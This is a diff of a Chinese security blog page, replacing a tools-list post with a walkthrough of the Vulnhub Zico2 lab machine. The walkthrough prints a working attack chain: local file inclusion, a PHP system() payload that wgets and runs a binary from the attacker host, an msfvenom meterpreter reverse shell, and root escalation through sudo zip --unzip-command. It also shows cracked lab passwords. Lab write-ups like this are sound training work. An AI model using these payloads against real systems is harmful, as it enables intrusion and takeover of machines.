@@ -15,18 +15,37 @@
 
 
 
-<meta name="description" content="概述记录收集的一些有用、有趣的站点或工具软件。 工具全绿色，坚决不用有广告的软件。">
-<meta name="keywords" content="收集,干货">
+<meta name="description" content="0x00 环境 靶机：Zico2 攻击机：Kali Linux VirtualBox 网络连接方式：host-only、DHCP   目标：boot2root获取flag。">
+<meta name="keywords" content="文件包含,Getshell,权限提升,靶机">
 <meta property="og:type" content="article">
-<meta property="og:title" content="干货杂项收集">
-<meta property="og:url" content="https://sakuxa.com/2019/02/22/干货杂项收集/index.html">
+<meta property="og:title" content="Vulnhub靶机渗透笔记——Zico2">
+<meta property="og:url" content="https://sakuxa.com/2019/02/26/hack-zico/index.html">
 <meta property="og:site_name" content="IT技术学习分享自留地">
-<meta property="og:description" content="概述记录收集的一些有用、有趣的站点或工具软件。 工具全绿色，坚决不用有广告的软件。">
+<meta property="og:description" content="0x00 环境 靶机：Zico2 攻击机：Kali Linux VirtualBox 网络连接方式：host-only、DHCP   目标：boot2root获取flag。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-02-25T01:33:39.932Z">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/discovery.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/port.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/whatweb.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/dirb.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/dbadmin.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/1.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/2.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/3.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/4.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/5.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/7.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/8.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/9.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/10.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/11.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/12.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/13.png">
+<meta property="og:image" content="https://sakuxa.com/2019/02/26/hack-zico/14.png">
+<meta property="og:updated_time" content="2019-02-27T06:47:55.868Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="干货杂项收集">
-<meta name="twitter:description" content="概述记录收集的一些有用、有趣的站点或工具软件。 工具全绿色，坚决不用有广告的软件。">
+<meta name="twitter:title" content="Vulnhub靶机渗透笔记——Zico2">
+<meta name="twitter:description" content="0x00 环境 靶机：Zico2 攻击机：Kali Linux VirtualBox 网络连接方式：host-only、DHCP   目标：boot2root获取flag。">
+<meta name="twitter:image" content="https://sakuxa.com/2019/02/26/hack-zico/discovery.png">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -58,7 +77,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>干货杂项收集 | IT技术学习分享自留地</title>
+<title>Vulnhub靶机渗透笔记——Zico2 | IT技术学习分享自留地</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -262,11 +281,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-干货杂项收集" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-hack-zico" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/02/22/干货杂项收集/" class="article-date">
-      <time datetime="2019-02-22T04:55:01.000Z" itemprop="datePublished">2019-02-22</time>
+      <a href="/2019/02/26/hack-zico/" class="article-date">
+      <time datetime="2019-02-26T02:30:34.000Z" itemprop="datePublished">2019-02-26</time>
 </a>
 
 
@@ -281,7 +300,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      干货杂项收集
+      Vulnhub靶机渗透笔记——Zico2
     </h1>
   
 
@@ -290,13 +309,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/Misc/">Misc</a>
+    <a class="article-category-link" href="/categories/Vulnhub/">Vulnhub</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/干货/">干货</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/收集/">收集</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Getshell/">Getshell</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/文件包含/">文件包含</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/权限提升/">权限提升</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶机/">靶机</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -306,52 +325,94 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>记录收集的一些有用、有趣的站点或工具软件。</p>
-<p>工具全绿色，坚决不用有广告的软件。</p>
-<a id="more"></a>
-<p><strong>装机必备软件</strong></p>
-<ul>
-<li>开源绿色压缩、解压软件：<a href="http://www.bandisoft.com/bandizip/" target="_blank" rel="noopener">Banzip</a></li>
-<li>绿色版迅雷5</li>
-</ul>
-<p><strong>简洁干净搜索主页</strong></p>
-<ul>
-<li>KIM：<a href="https://www.zhuye.kim/" target="_blank" rel="noopener">https://www.zhuye.kim/</a></li>
-<li>柠檬搜索：<a href="http://www.llemon.cn/" target="_blank" rel="noopener">http://www.llemon.cn/</a>  </li>
-<li>柴度搜索：<a href="https://www.chaidu.com/" target="_blank" rel="noopener">https://www.chaidu.com/</a></li>
-<li>安全导航：<a href="https://www.shentoushi.top/" target="_blank" rel="noopener">https://www.shentoushi.top/</a></li>
-</ul>
-<p><strong>Win2Mac 桌面美化</strong></p>
-<ul>
-<li>酷鱼桌面</li>
-<li>软媒桌面</li>
-<li><a href="http://www.upupoo.com/" target="_blank" rel="noopener">upupoo</a>：动态壁纸桌面 + 追番（神器）  </li>
-<li>Wallpaper Engine：Steam平台付费。</li>
-</ul>
-<p><strong>PPT等资源</strong></p>
-<ul>
-<li><a href="http://www.hippter.com/" target="_blank" rel="noopener">http://www.hippter.com/</a><ul>
-<li>收纳了众多PPT模板等素材的网站。</li>
+        <h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ul>
+<li>靶机：<a href="https://www.vulnhub.com/series/zico2,137/#modal210download" target="_blank" rel="noopener">Zico2</a></li>
+<li>攻击机：Kali Linux</li>
+<li>VirtualBox<ul>
+<li>网络连接方式：host-only、DHCP</li>
 </ul>
 </li>
+<li>目标：boot2root获取flag。</li>
 </ul>
-<p><strong>效率工具</strong></p>
+<a id="more"></a>
+<h2 id="0x01-信息收集与漏洞挖掘"><a href="#0x01-信息收集与漏洞挖掘" class="headerlink" title="0x01 信息收集与漏洞挖掘"></a>0x01 信息收集与漏洞挖掘</h2><p><strong>1.主机发现：</strong><code>nmap -sn 192.168.110.0/24</code></p>
+<p>靶机自动获取IP，使用nmap进行主机发现，最终确定：靶机IP为192.168.110.3、攻击机IP：192.168.110.4、宿主机：192.168.110.5。</p>
+<p><img src="/2019/02/26/hack-zico/discovery.png" alt></p>
+<p><strong>2.端口探测：</strong><code>nmap -Pn -sV -n -T4 -p- 192.168.110.3</code></p>
+<p>端口探测结果如下图，关注端口号22的SSH服务以及端口号80的Web服务。</p>
+<p>还确定了靶机系统为Ubuntu Linux、Web容器为Apache。</p>
+<p><img src="/2019/02/26/hack-zico/port.png" alt></p>
+<p><strong>3.Web服务</strong></p>
 <ul>
-<li><a href="https://www.voidtools.com/zh-cn/" target="_blank" rel="noopener">everything</a>：本地文件全局快速搜索。</li>
-<li><a href="https://www.snipaste.com/" target="_blank" rel="noopener">Snipaste</a>：截图工具</li>
-<li><a href="https://sspai.com/post/47776" target="_blank" rel="noopener">quicker</a>：效率效率。</li>
+<li>服务探测：<code>whatweb http://192.168.110.3 -a 3</code></li>
 </ul>
-<p><strong>在线云手机验证码接收，防骚扰</strong></p>
+<p><img src="/2019/02/26/hack-zico/whatweb.png" alt></p>
 <ul>
-<li><a href="https://sms.cngrok.com/receiving-sms" target="_blank" rel="noopener">https://sms.cngrok.com/receiving-sms</a></li>
-<li><a href="http://www.smszk.com/" target="_blank" rel="noopener">http://www.smszk.com/</a></li>
-<li><a href="https://sms.cm/" target="_blank" rel="noopener">https://sms.cm/</a></li>
-<li>地址大合集：<a href="https://bbs.ichunqiu.com/thread-48282-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-48282-1-1.html</a></li>
+<li>目录爆破：<code>dirb http://192.168.110.3</code></li>
 </ul>
-<p><strong>在线工具</strong></p>
+<p>爆破发现dbadmin，访问发现存在目录遍历漏洞，且目录下存在test_db.php文件。</p>
+<p><img src="/2019/02/26/hack-zico/dirb.png" alt></p>
+<p><img src="/2019/02/26/hack-zico/dbadmin.png" alt></p>
+<p>访问test_db.php发现是sqlite数据库连接管理页面phpLiteAdmin（类似phpmyadmin），尝试弱口令admin，成功进入。</p>
+<p>进入数据库管理页面后可获得以下信息：</p>
+<blockquote>
+<p>数据库路径：<code>/usr/databases/</code></p>
+<p>数据库名：<code>test_users</code></p>
+<p>数据表：<code>info</code></p>
+</blockquote>
+<p><img src="/2019/02/26/hack-zico/1.png" alt></p>
+<p>查看数据表info，发现里面存在两条记录，判断是用户的用户名和密码。将密码拿到<a href="https://www.somd5.com/" target="_blank" rel="noopener">somd5</a>网站解密，得到结果：</p>
+<blockquote>
+<p>root  34kroot34</p>
+<p>zico  zico2215@</p>
+</blockquote>
+<p>将得到的两个用户名密码尝试进行SSH登录，结果失败。</p>
 <ul>
-<li>全能在线工具：<a href="https://www.toolnb.com/" target="_blank" rel="noopener">https://www.toolnb.com/</a></li>
+<li>漏洞扫描</li>
 </ul>
+<p>使用宿主机的AWVS进行漏洞扫描，发现存在文件包含、目录穿越漏洞。存在漏洞的连接为：<code>http://192.168.110.3/view.php?page=tools.html</code></p>
+<p><img src="/2019/02/26/hack-zico/2.png" alt></p>
+<p>验证漏洞，尝试包含/etc/passwd文件，发现成功包含。</p>
+<p><img src="/2019/02/26/hack-zico/3.png" alt></p>
+<h2 id="0x02-Getshell"><a href="#0x02-Getshell" class="headerlink" title="0x02 Getshell"></a>0x02 Getshell</h2><p>sqlite属于单文件数据库，类似Access数据库。</p>
+<p><strong>1.思路一</strong></p>
+<p>尝试通过数据库管理页面创建数据库的功能点创建一个shell文件，创建<code>../../var/www/html/shell.php</code>，<code>/</code>会被过滤，该方法不可行。</p>
+<p><strong>2.思路二：文件包含Getshell</strong></p>
+<p>先尝试通过日志文件<code>/var/log/apache2/access.log</code>，先访问<code>http://192.168.110.3/&lt;?php phpinfo();?&gt;</code>，然后尝试包含日志文件，发现没用。猜测是因为没有读取权限。</p>
+<p>包含数据库文件Getshell</p>
+<p>首先通过phpLiteAdmin向info表插入一条数据：<code>&lt;?php system(&quot;cd /tmp;wget http://192.168.110.4/shell;chmod +x shell;./shell&quot;);?&gt;</code>，该记录作用是进入/tmp目录，然后通过wget从攻击机上下载shell文件，再对shell文件添加执行权限然后运行。</p>
+<p><img src="/2019/02/26/hack-zico/4.png" alt></p>
+<p>然后在攻击机上使用msfvenon生成shell文件：<code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.110.4 lport=4444 -f elf &gt; shell</code></p>
+<p>在shell文件所在的路径建立一个简单HTTP服务器：<code>python -m SimpleHTTPServer 80</code></p>
+<p>设置msf监听，<code>use exploit/multi/hander</code>、<code>set payload linux/x86/meterpreter/reverse_tcp</code>、<code>set lhost 192.168.110.4</code>。</p>
+<p>访问连接<code>http://192.168.110.3/view.php?page=../../usr/databases/test_users</code>，然后会得到一个meterpreter会话。</p>
+<p><img src="/2019/02/26/hack-zico/5.png" alt></p>
+<h2 id="0x03-权限提升"><a href="#0x03-权限提升" class="headerlink" title="0x03 权限提升"></a>0x03 权限提升</h2><p>获得靶机shell后查看用户，发现不是root，需要提权。</p>
+<p><img src="/2019/02/26/hack-zico/7.png" alt></p>
+<p>首先查看<code>/etc/passwd</code>文件，找出id大于1000的用户，发现值得关注的用户有root、zico。</p>
+<p><img src="/2019/02/26/hack-zico/8.png" alt></p>
+<p>查找属主为zico的文件：<code>find / -user zico 2&gt; /dev/null</code>，执行后结果过多。直接<code>cd /home/zico</code>到zico的家目录。发现其中有个wordpress目录，猜测应该是博客系统代码。进入该目录发现wordpress的配置文件wp-config.php，查看文件内容，找到数据库密码：<code>sWfCsfJSPV9H3AmQzw8</code>。</p>
+<p><img src="/2019/02/26/hack-zico/9.png" alt></p>
+<p>尝试使用该用户名密码登录SSH：<code>ssh zico@sWfCsfJSPV9H3AmQzw8</code>。成功登录。</p>
+<p>使用<code>sudo -l</code>命令查看zico用户可以执行的root命令。发现可以执行<code>/bin/tar</code>、<code>/usr/bin/zip</code>。</p>
+<p><img src="/2019/02/26/hack-zico/10.png" alt></p>
+<p>执行<code>touch /tmp/exploit</code>、<code>sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=&quot;bash -c /bin/sh&quot;</code></p>
+<p>成功提权至root。</p>
+<p><img src="/2019/02/26/hack-zico/11.png" alt></p>
+<p>获取flag，进入root用户家目录，flag在目录下的flag.txt文件。</p>
+<p><img src="/2019/02/26/hack-zico/12.png" alt></p>
+<p><strong>另一种提权方式</strong></p>
+<p>获得反弹shell后，查看系统内核版本，发现内核版本为3.2.0-23。</p>
+<p><img src="/2019/02/26/hack-zico/13.png" alt></p>
+<p>到<a href="https://www.exploit-db.com/search" target="_blank" rel="noopener">Exploit-DB</a>搜索内核提权漏洞，并下载Exp到靶机编译执行。</p>
+<p><img src="/2019/02/26/hack-zico/14.png" alt></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul>
+<li>文件包含Getshell，还可以尝试包含其他文件，如SSH登录日志文件等。</li>
+<li>Python2搭建简单HTTP服务器来传文件：<code>python -m SimpleHTTPServer 80</code></li>
+<li>上传/执行文件遇权限问题时，可传到<code>/tmp</code>目录。</li>
+</ul>
+<p><strong>参考连接</strong></p>
+<p><a href="https://www.colabug.com/1925534.html" target="_blank" rel="noopener">https://www.colabug.com/1925534.html</a></p>
 
       
     </div>
@@ -360,13 +421,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/02/22/干货杂项收集/">干货杂项收集</a></p>
+        <p><span>本文标题:</span><a href="/2019/02/26/hack-zico/">Vulnhub靶机渗透笔记——Zico2</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">sh4douu</a></p>
-        <p><span>发布时间:</span>2019-02-22, 12:55:01</p>
-        <p><span>最后更新:</span>2019-02-25, 09:33:39</p>
+        <p><span>发布时间:</span>2019-02-26, 10:30:34</p>
+        <p><span>最后更新:</span>2019-02-27, 14:47:55</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/02/22/干货杂项收集/" title="干货杂项收集">https://sakuxa.com/2019/02/22/干货杂项收集/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://sakuxa.com/2019/02/22/干货杂项收集/　　作者: sh4douu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/02/26/hack-zico/" title="Vulnhub靶机渗透笔记——Zico2">https://sakuxa.com/2019/02/26/hack-zico/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://sakuxa.com/2019/02/26/hack-zico/　　作者: sh4douu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -378,16 +439,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/02/22/GitNote/">
-                    Git基本命令及使用
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/02/21/build-blog/">
-                    博客搭建记录 Node.js + Hexo + Yelee + Git Pages
+                <a href="/2019/02/25/phpcms9-6-1/">
+                    PHPCMSv9.6.1任意文件下载漏洞复现
                 </a>
             </div>
         
@@ -399,7 +454,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-环境"><span class="toc-number">1.</span> <span class="toc-text">0x00 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-信息收集与漏洞挖掘"><span class="toc-number">2.</span> <span class="toc-text">0x01 信息收集与漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Getshell"><span class="toc-number">3.</span> <span class="toc-text">0x02 Getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-权限提升"><span class="toc-number">4.</span> <span class="toc-text">0x03 权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-总结"><span class="toc-number">5.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
         
     </div>
     <style>
@@ -435,7 +490,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"干货杂项收集　| IT技术学习分享自留地　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Vulnhub靶机渗透笔记——Zico2　| IT技术学习分享自留地　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -455,15 +510,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/02/22/GitNote/" title="上一篇: Git基本命令及使用">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/02/21/build-blog/" title="下一篇: 博客搭建记录 Node.js + Hexo + Yelee + Git Pages">
+            <a href="/2019/02/25/phpcms9-6-1/" title="下一篇: PHPCMSv9.6.1任意文件下载漏洞复现">
                 <i class="fa fa-angle-right"></i>
             </a>
         
